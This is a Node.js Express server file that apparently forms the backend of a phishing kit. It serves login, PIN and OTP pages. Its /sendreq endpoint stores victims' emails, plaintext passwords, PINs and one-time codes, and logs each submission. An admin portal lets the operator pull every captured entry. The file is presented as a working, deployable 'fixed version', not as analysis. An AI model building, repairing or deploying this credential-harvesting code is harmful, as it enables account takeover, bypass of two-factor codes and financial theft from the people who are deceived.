// app.js (fixed version)
import express from 'express';
import dotenv from 'dotenv';
import path from 'path';
import cors from 'cors';
import jsonwebtoken from 'jsonwebtoken';
import bcrypt from 'bcrypt';
import { fileURLToPath } from 'url';
import DBconnection from './Dbconnection.js';

// Load environment variables
dotenv.config();

// ES module dirname fix
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

// Create express app
const app = express();

// REQUIRED FOR RAILWAY
const PORT = process.env.PORT || 3100;

// --- MIDDLEWARE ---
app.use(express.json());
app.use(cors({
  origin: "*",
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Serve static files correctly
app.use(express.static(path.join(__dirname, 'www')));

// Router setup
const router = express.Router();
app.use('/', router);

// JWT middleware
function middleware(req, res, next) {

  const cookieHeader = req.headers.cookie;
  if (!cookieHeader) return res.status(401).json({ msg: "No token" });

  const token = cookieHeader.split('token=')[1];
  if (!token) return res.status(401).json({ msg: "Token missing" });

  jsonwebtoken.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ msg: "Invalid token" });

    req.user = user;
    next();
  });
}

// --- ROUTES ---

// HOME PAGE
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'index.html'));
});

// LOGIN PAGE
router.get('/login', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'login.html'));
});

// PIN PAGE
router.get('/pin', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'pin.html'));
});

// OTP PAGE
router.get('/otp', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'otp.html'));
});

// ADMIN PAGE
router.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'www', 'adm.html'));
});

// COLLECT USER LOGIN / PIN / OTP
app.post('/sendreq', async (req, res) => {
  const { msg, email, password, pin, otp } = req.body;

  console.log(req.body);

  if (msg === 'login') {
    const date = new Date();

    const insert = await DBconnection.query(
      `INSERT INTO access (username, complaint, pin, password, verification_code, date)
       VALUES ($1, $2, $3, $4, $5, $6) RETURNING *`,
      [
        email,
        '',
        '',
        password,
        '',
        `Time: ${date.getHours()}:${date.getMinutes()} Date: ${date.getDate()}/${date.getMonth() + 1}/${date.getFullYear()}`
      ]
    );

    return res.json({ msg: 'successful' });
  }

  if (msg === 'pin') {
    const update = await DBconnection.query(
      'UPDATE access SET pin = $1 WHERE username = $2 RETURNING *',
      [pin, email]
    );
    return res.json({ msg: 'successful' });
  }

  if (msg === 'otp') {
    const update = await DBconnection.query(
      'UPDATE access SET verification_code = $1 WHERE username = $2 RETURNING *',
      [otp, email]
    );
    return res.json({ msg: 'successful' });
  }
});

// ADMIN PORTAL
router.post('/portal', async (req, res) => {

  const auth = req.headers.authorization;
  if (!auth) return res.status(401).json({ msg: "No token" });

  const key = process.env.JWT_SECRET;

  // ADMIN LOGIN
  if (req.body.msg === 'login') {
    const { username, password } = req.body;

    const userCheck = await DBconnection.query(
      'SELECT * FROM admin WHERE username = $1',
      [username]
    );

    if (userCheck.rows.length !== 1)
      return res.status(404).json({ msg: "no user found" });

    const admin = userCheck.rows[0];
    const valid = await bcrypt.compare(password, admin.password);

    if (!valid)
      return res.status(403).json({ msg: "incorrect password" });

    const all_entries = await DBconnection.query('SELECT * FROM access');

    const token = jsonwebtoken.sign(
      { username: admin.username },
      key,
      { expiresIn: '1h' }
    );

    return res.json({
      msg: 'successful',
      all: all_entries.rows,
      token
    });
  }

  // CHECK LOGIN
  if (req.body.msg === 'checklogin') {
    jsonwebtoken.verify(auth, key, async (err, user) => {
      if (err) return res.json({ msg: 'invalid token' });

      const all_entries = await DBconnection.query('SELECT * FROM access');
      return res.json({ msg: 'successful', all: all_entries.rows });
    });
  }

});

// --- START SERVER ---
app.listen(PORT, () =>
  console.log(`🚀 Server running on port ${PORT}`)
)
